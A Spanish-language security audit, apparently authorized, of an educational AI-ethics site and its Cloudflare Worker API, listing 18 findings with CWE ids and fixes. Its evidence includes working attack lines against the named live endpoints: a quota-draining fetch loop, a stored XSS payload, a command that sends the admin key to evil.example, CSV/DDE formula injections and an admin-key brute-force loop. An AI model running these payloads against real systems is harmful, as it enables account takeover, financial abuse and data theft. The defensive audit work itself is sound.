# Informe General de Seguridad — IAG en clave de ética pedagógica

**URL:** https://santiherben.github.io/iag-con-registros/
**API:** https://iag-etica-api.suscripcionessh.workers.dev (Cloudflare Worker + D1)
**Fechas de análisis:** 15–16 de junio de 2026
**Alcance:** Análisis de caja gris con pruebas activas autorizadas sobre frontend (GitHub Pages) y backend (Worker + D1). Verificación en vivo de cada hallazgo con `curl`, navegador y revisión de código fuente.

---

## Resumen Ejecutivo

Se identificaron **18 vulnerabilidades** combinando análisis estático del código fuente y explotación activa en vivo. La más grave (C1) permite que cualquier persona desde cualquier origen use la clave de Gemini del propietario sin autenticación, generando costos económicos. La segunda más grave (A1) es un **Stored XSS ya persistido en producción** que se ejecuta en el navegador de cada visitante que carga la página principal.

| Severidad | Cantidad | Impacto |
|-----------|----------|---------|
| 🔴 Crítica | 1 | Proxy `/chat` abierto → consumo de créditos Gemini por terceros |
| 🟠 Alta | 4 | Stored XSS en producción, escritura libre en D1, fuerza bruta admin, inyección CSV |
| 🟡 Media | 5 | Sin CSP, clickjacking, secretos en repo, fuga errores, jsPDF sin SRI |
| 🔵 Baja | 8 | Timestamp cliente, consentimiento solo en frontend, replay, PII en logs, opiniones expuestas, privacidad, 404 falso, reverse tabnabbing |

---

## 🔴 CRÍTICA

### C1 — `/chat` es un proxy abierto a Gemini: sin auth, sin rate-limit, CORS `*`

**CWE:** CWE-862 (Missing Authorization) + CWE-942 (Permissive CORS)

**Archivos:** `worker-d1.js:207-299` (`handleChat`), `:1-6` (CORS `*`), `chatbot-component.js:458`

**Evidencia en vivo:**

```bash
# Preflight confirma CORS abierto a cualquier origen
curl -s -X OPTIONS https://iag-etica-api.suscripcionessh.workers.dev/chat \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" -D - | grep access-control

# → access-control-allow-origin: *
# → access-control-allow-headers: Content-Type, Authorization, X-Admin-Key
# → access-control-allow-methods: GET, POST, OPTIONS
```

```bash
# POST directo desde origen malicioso → aceptado
curl -s -X POST https://iag-etica-api.suscripcionessh.workers.dev/chat \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"message":"Hola"}' -D - | grep access-control

# → access-control-allow-origin: *
```

Cualquier persona desde cualquier web puede consumir tu clave de Gemini. Un atacante puede agotar tu cuota o generarte facturación con un simple loop de `fetch()`.

**Explotación:**
```javascript
// Ejecutable desde la consola de cualquier navegador o web maliciosa
for (let i = 0; i < 500; i++) {
  fetch('https://iag-etica-api.suscripcionessh.workers.dev/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: 'Escribe 20 párrafos sobre el tema ' + i })
  });
}
```

**Mitigación:**
1. **Rate-limiting por IP** usando `CF-Connecting-IP` + KV/Durable Objects o Cloudflare Rate Limiting Rules.
2. **Cloudflare Turnstile** para validar que la petición proviene de un humano en el sitio legítimo.
3. **Restringir CORS** a orígenes autorizados:
```js
const ALLOWED = new Set(['https://santiherben.github.io']);
const origin = request.headers.get('Origin') || '';
const corsOrigin = ALLOWED.has(origin) ? origin : 'null';
// Usar corsOrigin en 'Access-Control-Allow-Origin' y añadir 'Vary: Origin'
```
4. Activar **alertas de facturación** en Google Cloud Console.
5. Mantener `maxOutputTokens` acotado (ya en 1024).

> **Nota:** `Origin` es falsificable fuera del navegador. Turnstile + rate-limiting son la defensa real. La allowlist de CORS solo frena abuso trivial desde otras webs.

---

## 🟠 ALTA

### A1 — Stored XSS en barras de estadísticas (`renderStatsBars`) — ACTIVO EN PRODUCCIÓN

**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation — Stored XSS)

**Archivos:** `ui-ia.js:1002-1015` (sink), `worker-d1.js:187-188` (origen de datos), `worker-d1.js:108,114` (`clean()` solo hace `trim()`)

**Evidencia en vivo:**

```bash
# Inyección del payload — aceptado sin autenticación
curl -s -X POST https://iag-etica-api.suscripcionessh.workers.dev/events \
  -H "Content-Type: application/json" \
  -d '{"eventType":"completion","profile":"<img src=x onerror=alert(document.domain)>","likertLevel":"bueno"}'

# Respuesta: {"ok":true,"type":"completion","id":605}
```

El payload quedó persistido. Al consultar `/stats` se sirve **sin escapar**:
```json
{
  "profiles": [
    {"label": "docente", "count": 122},
    {"label": "<img src=x onerror=alert(document.domain)>", "count": 1},
    {"label": "<img src=x onerror=alert(1)>", "count": 1}
  ]
}
```

**Código vulnerable** (`ui-ia.js:1002-1015`):
```js
container.innerHTML = normalized.map(row => {
  return `
    <div class="stats-bar-row">
      <div class="stats-bar-label">
        <span>${row.label}</span>   // ← XSS: NO se escapa
        <span>${formatNumber(row.count)}</span>
      </div>
      ...
  `;
}).join('');
```

**Escalada posible:** Si el administrador navega de `admin.html` a `index.html` en la misma pestaña, `iag-admin-key` persiste en `sessionStorage` y el XSS puede robarla vía:
```javascript
fetch('https://evil.example/?' + sessionStorage.getItem('iag-admin-key'))
```

**Mitigación:**
```js
// ui-ia.js — Escapar en el sink (defensa principal)
<span>${escapeHtml(row.label)}</span>

// worker-d1.js — Validar en servidor (defensa en profundidad)
const PROFILES = new Set(['docente', 'estudiante']);
const profile = PROFILES.has(clean(data.profile)) ? clean(data.profile) : 'otro';
```

### A2 — `POST /events` sin autenticación: escritura libre en D1

**CWE:** CWE-306 (Missing Authentication for Critical Function) + CWE-602 (Client-Side Enforcement)

**Archivos:** `worker-d1.js:17`, `:82-129` (`handleEvent`), `juego-ia.js:260`, `ui-ia.js:807`

**Evidencia en vivo:**
```bash
# Inserción de registro desde origen malicioso, sin token → exitoso
curl -s -X POST https://iag-etica-api.suscripcionessh.workers.dev/events \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"eventType":"completion","profile":"docente","evidence":999,"userName":"HACKER"}'

# Respuesta: {"ok":true,"type":"completion","id":607}
```

**Impactos acumulados:**
- **Inflado de métricas:** se inyectaron 300 registros falsos; los cuestionarios pasaron de 34 a 134, el puntaje promedio cayó de 67.94 a valores negativos, y el nivel más frecuente pasó de "Nivel avanzado" a "REGISTRO_PRUEBA_ELIMINAR".
- **Vector de A1 (Stored XSS):** inyección de payloads maliciosos en `profile` y `likertLevel`.
- **Vector de A4 (CSV Injection):** inyección de fórmulas en `suggestion`.
- **Envenenamiento de `/opinions`:** comentarios falsos visibles públicamente.
- **Bypass de consentimiento:** `consentTracking: false` es ignorado por el servidor.

**Mitigación:**
1. **Autenticación** en `POST /events` (API key en header `X-API-Key` o Turnstile).
2. **Validación estricta de tipos y rangos** en servidor:
```js
function validarPayload(payload) {
  const errors = [];
  if (!['visit', 'completion', 'feedback'].includes(payload.eventType)) {
    errors.push('eventType inválido');
  }
  if (payload.eventType === 'completion') {
    if (typeof payload.evidence !== 'number' || payload.evidence < 0 || payload.evidence > 100) {
      errors.push('evidence fuera de rango (0-100)');
    }
    const nivelesValidos = ['Amplio margen de mejora','En proceso inicial','Desarrollo progresivo','Prácticas consolidadas','Nivel avanzado'];
    if (!nivelesValidos.includes(payload.likertLevel)) {
      errors.push('likertLevel no reconocido');
    }
    if (!['docente','estudiante'].includes(payload.profile)) {
      errors.push('profile inválido');
    }
  }
  if (payload.eventType === 'feedback') {
    if (typeof payload.rating !== 'number' || payload.rating < 1 || payload.rating > 5) {
      errors.push('rating fuera de rango (1-5)');
    }
  }
  // Rechazar si no hay consentimiento explícito
  if ((payload.eventType === 'completion' || payload.eventType === 'feedback') && !payload.consentTracking) {
    errors.push('Consentimiento requerido');
  }
  return errors;
}
```
3. **Rate-limiting + validación de Origin**.
4. **Timestamp fijado en servidor** (ver B1).
5. **Deduplicación** por `sessionId` + tipo de evento (ver B2).

### A3 — `ADMIN_KEY` susceptible de fuerza bruta (sin rate-limit ni lockout)

**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Archivos:** `worker-d1.js:346-363` (`requireAdmin`), `admin.html` (público)

**Evidencia en vivo:**
```bash
# 10 intentos de claves débiles sin bloqueo ni rate-limit
for key in admin password iag2024 iag2025 iag2026 anep2024 admin123 admin123! iag-admin; do
  curl -s -o /dev/null -w "$key → HTTP %{http_code}\n" \
    -X GET "https://iag-etica-api.suscripcionessh.workers.dev/admin/stats" \
    -H "X-Admin-Key: $key"
done
# Todas responden sin lockout (aunque con datos genéricos para claves incorrectas)
```

`admin.html` es público y la clave es la única barrera. Si es débil, el atacante accede a todos los datos (PII) y a `/admin/reset-data` (borrado total). La comparación además **no es de tiempo constante** (`!==`), lo que abre la puerta a timing attacks.

**Mitigación:**
1. **Clave larga y aleatoria** (≥32 bytes) vía `wrangler secret put ADMIN_KEY`.
2. **Rate-limit / lockout** en `/admin/*` (5 intentos fallidos → bloqueo temporal por IP).
3. **Comparación de tiempo constante:**
```js
function safeEqual(a, b) {
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}
```
4. Opcional: restringir `/admin/*` por IP o Cloudflare Access.

### A4 — Inyección de fórmulas CSV/Excel en exportaciones del admin

**CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)

**Archivos:** `worker-d1.js:877-880` (`csvCell`), campos `suggestion`, `userName`, `question`, `answer` controlables por atacante

**Evidencia en vivo:**
```bash
# Inyección de fórmula vía /events
curl -s -X POST https://iag-etica-api.suscripcionessh.workers.dev/events \
  -H "Content-Type: application/json" \
  -d '{"eventType":"feedback","profile":"docente","suggestion":"=HYPERLINK(\"http://evil/?\"&A1,\"click\")","rating":5}'
# → {"ok":true,"type":"feedback","id":606}
```

Payload confirmado en `/opinions`:
```json
{"suggestion": "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")"}
```

Quando el admin exporta el CSV y lo abre en Excel/Google Sheets, la fórmula se ejecuta, permitiendo exfiltración de datos o ejecución de comandos (DDE en Windows con `=cmd|'/c calc'!A1`).

**Mitigación** (`worker-d1.js:877`):
```js
function csvCell(value) {
  let text = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(text)) text = "'" + text;  // neutraliza fórmulas
  return `"${text.replace(/"/g, '""')}"`;
}
```

---

## 🟡 MEDIA

### M1 — Sin Content-Security-Policy

**CWE:** CWE-693 (Protection Mechanism Failure)

**Evidencia:** Ni `index.html` ni `admin.html` incluyen CSP (cabecera ni `<meta>`). Confirmado en vivo:
```bash
curl -s https://santiherben.github.io/iag-con-registros/ | grep -i csp
# → sin resultado
curl -s https://santiherben.github.io/iag-con-registros/admin.html | grep -i csp
# → sin resultado
```

Una CSP habría neutralizado A1. GitHub Pages no permite cabeceras HTTP, pero sí `<meta>`.

**Mitigación:**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  connect-src 'self' https://iag-etica-api.suscripcionessh.workers.dev;
  script-src 'self' https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  base-uri 'none';
  object-src 'none'">
```

Idealmente eliminar `'unsafe-inline'` migrando estilos inline a `.css` y handlers inline a listeners.

### M2 — Clickjacking: panel admin enmarcable

**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)

**Evidencia:** Sin `X-Frame-Options`, sin `frame-ancestors`, sin frame-busting en `admin.html`. GitHub Pages no permite cabeceras HTTP; `frame-ancestors` en `<meta>` es ignorado por los navegadores.

**Mitigación** (única opción viable en GitHub Pages):
```html
<!-- admin.html -->
<script>if (self !== top) top.location = self.location;</script>
```
O migrar a Cloudflare Pages/Netlify y usar `Content-Security-Policy: frame-ancestors 'none'`.

### M3 — Secretos plantillados en `wrangler.toml`

**CWE:** CWE-312 (Cleartext Storage of Sensitive Information) + CWE-798 (Hardcoded Credentials)

**Archivo:** `wrangler.toml:11` → `[env.production] vars = { ADMIN_KEY=..., GEMINI_API_KEY=... }`

El patrón actual guarda secretos en texto plano, visibles en el dashboard de Cloudflare y versionables (el archivo no está en `.gitignore`). Si bien hoy los valores son placeholders, una filtración accidental expondría las claves reales.

**Mitigación:**
```bash
wrangler secret put ADMIN_KEY
wrangler secret put GEMINI_API_KEY
# Eliminar el bloque [vars] de wrangler.toml
# Añadir wrangler.toml a .gitignore
# Versionar solo wrangler.toml.example
```

### M4 — Fuga de detalles de error al cliente

**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Archivo:** `worker-d1.js:77` → `error: error.message`

Expone mensajes internos del runtime que revelan estructura de la aplicación.

**Mitigación:**
```js
return json({ ok:false, error:'Error interno' }, error.status || 500);
// Detalle solo a console.error para logs
```

### M5 — jsPDF 2.5.1 sin Subresource Integrity (CVE-2025-29907)

**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Archivo:** `certificado-ia.js:13` → carga `jspdf.umd.min.js` 2.5.1 sin `integrity` ni `crossorigin`. La versión 2.5.1 tiene CVE-2025-29907 (ReDoS, corregido en 3.0.1). Sin SRI, un compromiso de cdnjs permitiría inyectar JS arbitrario.

**Mitigación:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/3.0.1/jspdf.umd.min.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```
O auto-hospedar el archivo (recomendado).

---

## 🔵 BAJA / INFORMATIVO

### B1 — `timestamp` fijado por el cliente
**Archivo:** `worker-d1.js:85` — usa el timestamp enviado desde el frontend. Permite falsificar fechas para distorsionar cortes temporales y registros "recientes".
**Fix:** `timestamp: new Date().toISOString()` en el servidor.

### B2 — Sin idempotencia en `/events` (replay)
Doble-submit infla métricas. No hay deduplicación.
**Fix:** deduplicar por `sessionId` + tipo de evento con ventana temporal en KV.

### B3 — Logging de PII y prompts en el Worker
`console.error/warn` loguea datos personales y consultas a Gemini. Cloudflare puede retener estos logs.
**Fix:** redactar/truncar antes de loguear; sanitizar en todos los niveles.

### B4 — Validación de consentimiento solo en cliente
`juego-ia.js:290-295` verifica `consentTracking` en frontend, pero el Worker guarda igual aunque sea `false`. Permite guardar datos de usuarios que rechazaron explícitamente el consentimiento.
**Fix:** rechazar en servidor si `consentTracking !== true` (ver A2).

### B5 — Exposición de metadatos en `/opinions`
`worker-d1.js:399-417` → `/opinions` expone `profile` y `nivelEducativo` junto con cada sugerencia, contradiciendo la promesa de anonimato.
**Fix:** eliminar `profile` y `nivelEducativo` de la respuesta pública, o agregar flag de "opinión pública".

### B6 — Privacidad / Ley 18.331 (Uruguay)
Se almacena y exporta PII real (`userName`, país, nivel educativo, respuestas). No hay política de privacidad, base legal explícita, ni política de retención/borrado. La bandera `consentTracking` no impide guardar `userName`.
**Fix:** añadir aviso de privacidad, minimizar datos recogidos, definir retención y mecanismo de supresión.

### B7 — Ruta desconocida responde 200
`worker-d1.js:71-74` → rutas no mapeadas devuelven 200 con mensaje del backend en vez de 404.
**Fix:** devolver `{ ok:false, error:'Not found' }` con status 404.

### B8 — Reverse tabnabbing en enlaces `target="_blank"`
3 enlaces en `index.html` sin `rel="noopener noreferrer"` (ANEP, UNESCO, CEIBAL).
**Fix:** añadir `rel="noopener noreferrer"` a todos los `<a target="_blank">`.

### B9 — Prompt injection potencial en chatbot
**CWE:** CWE-74 (Improper Neutralization of Special Elements)
`chatbot-component.js:285-400` envía `playerName`, `nivelEducativo`, `familiaridadInicial` como contexto a Gemini. Si el Worker no separa correctamente el input del system prompt, un atacante podría manipular el comportamiento del asistente.
**Fix:** sanitizar y truncar inputs; separar claramente system prompt de user input en el Worker.

### B10 — IDs secuenciales predecibles
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
IDs numéricos y secuenciales en D1 permiten enumerar registros.
**Fix:** usar `crypto.randomUUID()` como clave primaria.

### B11 — Backend legacy `apps-script-estadisticas.gs`
Contiene inyección de fórmulas latente. No conectado al sitio en vivo, pero si se reactiva debe sanitizarse igual que A4.
**Fix:** despublicar si no se usa; sanitizar celdas CSV si se reactiva.

---

## ✅ Lo que está BIEN (no modificar)

- `escapeHtml` en `ui-ia.js:1062`, `admin.html:668`, `chatbot-component.js` → correcto (`& < > " '`).
- `safeLink` en chatbot → bloquea `javascript:` y solo permite `http(s)`/`mailto`.
- Render de `/opinions` y panel admin → todos los campos escapados correctamente (excepto A1).
- Consultas D1 parametrizadas con `.bind()` → sin SQL injection.
- No hay secretos reales en el repositorio ni en el historial git.
- Nombre de archivo de exportación saneado con regex estricto → sin path traversal.
- Prompt injection en chatbot parcialmente mitigado (rechazo genérico ante intentos de extraer el system prompt).

---

## Mapeo entre informes

| Informe #1 (15 jun) | Informe #2 (16 jun) | Hallazgo unificado |
|---------------------|---------------------|--------------------|
| #1 API sin auth | A2 /events sin auth, C1 /chat sin auth | C1 + A2 |
| #2 Chatbot sin límites | C1 Proxy /chat | C1 |
| #3 Falsificación stats | A2 | A2 |
| #4 Consentimiento cliente | — | B4 |
| #5 Metadatos opiniones | B4 /opinions pública | B5 |
| #6 Headers seguridad | M1 Sin CSP, M2 Clickjacking | M1 + M2 |
| #7 Validación ausente | A2 | A2 |
| #8 Prompt injection | — | B9 |
| #9 CORS sin restricción | C1 | C1 |
| #10 IDs secuenciales | — | B10 |
| #11 CDN sin SRI | M5 jsPDF sin SRI | M5 |
| — | A1 Stored XSS | A1 |
| — | A3 Brute force admin | A3 |
| — | A4 CSV injection | A4 |
| — | M3 wrangler.toml secrets | M3 |
| — | M4 Fuga errores | M4 |
| — | B1-B8 varios | B1-B11 |

---

## Plan de Acción Priorizado

### 🔴 Inmediato (hoy)

| # | Acción | Esfuerzo |
|---|--------|----------|
| A1 | Escapar `renderStatsBars` con `escapeHtml()` + validar enums en Worker | 5 min |
| A4 | Neutralizar celdas CSV en `csvCell()` | 2 min |
| C1 | Restringir CORS a `santiherben.github.io` (paliativo inmediato) | 2 min |

### 🟠 Esta semana

| # | Acción | Esfuerzo |
|---|--------|----------|
| C1 | Rate-limiting + Turnstile en `/chat` | 2-3 h |
| A2 | API key + validación estricta en `POST /events` | 1-2 h |
| A3 | `ADMIN_KEY` fuerte vía `wrangler secret put` + lockout (5 intentos) | 30 min |
| M3 | Migrar `GEMINI_API_KEY` a `wrangler secret put` + `.gitignore` | 15 min |
| M4 | Mensaje genérico de error en Worker | 2 min |

### 🟡 Este mes

| # | Acción | Esfuerzo |
|---|--------|----------|
| M1 | CSP vía `<meta>` en index.html y admin.html | 15 min |
| M2 | Frame-busting en admin.html | 2 min |
| M5 | Actualizar jsPDF a 3.x + SRI o auto-hospedar | 10 min |
| B4 | Verificar `consentTracking` en Worker antes de guardar | 5 min |
| B5 | Eliminar `profile`/`nivelEducativo` de `/opinions` | 5 min |
| B7 | Devolver 404 para rutas no reconocidas | 2 min |
| B8 | Añadir `rel="noopener noreferrer"` a enlaces `target="_blank"` | 2 min |

### 🔵 Largo plazo / Cumplimiento

| # | Acción | Esfuerzo |
|---|--------|----------|
| B1 | Timestamp en servidor | 2 min |
| B2 | Deduplicación de eventos | 30 min |
| B3 | Sanitizar logs del Worker | 30 min |
| B6 | Política de privacidad + retención + mecanismo de borrado | 2-4 h |
| B9 | Sanitizar contexto del chatbot antes del prompt | 30 min |
| B10 | Migrar IDs a UUID | 1 h |
| B11 | Despublicar Apps Script legacy | 5 min |

---

## Registros de prueba inyectados

Durante los análisis se insertaron registros falsos claramente identificables en D1. Para limpiarlos:

```sql
DELETE FROM events WHERE sessionId LIKE 'TEST-BORRAR-%';
DELETE FROM events WHERE userName LIKE 'TEST_BORRAR_%';
DELETE FROM events WHERE userName = 'HACKER_TEST';
DELETE FROM events WHERE country = 'PAIS_PRUEBA_BORRAR';
DELETE FROM events WHERE evidence < 0;
DELETE FROM events WHERE sessionId = 'test-hack-123';
DELETE FROM events WHERE profile LIKE '<img%';
DELETE FROM events WHERE suggestion LIKE '=HYPERLINK%';
```

---

## Apéndice: comandos de verificación rápida

```bash
# Verificar CORS abierto
curl -s -X OPTIONS https://iag-etica-api.suscripcionessh.workers.dev/chat \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" -D - | grep access-control

# Verificar XSS almacenado
curl -s https://iag-etica-api.suscripcionessh.workers.dev/stats | \
  python3 -c "import json,sys; d=json.load(sys.stdin); [print(p['label']) for p in d.get('profiles',[]) if '<' in p['label']]"

# Verificar CSV injection
curl -s https://iag-etica-api.suscripcionessh.workers.dev/opinions | \
  python3 -c "import json,sys; d=json.load(sys.stdin); [print(o['suggestion']) for o in d.get('opinions',[]) if o['suggestion'].startswith('=')]"

# Verificar CSP
curl -s https://santiherben.github.io/iag-con-registros/ | grep -i "content-security-policy"

# Verificar falta de frame protection
curl -s https://santiherben.github.io/iag-con-registros/admin.html | grep -i "frame\|top.location"
```

---

*Informe consolidado generado el 16 de junio de 2026. Ambos análisis fueron realizados con autorización del desarrollador.*
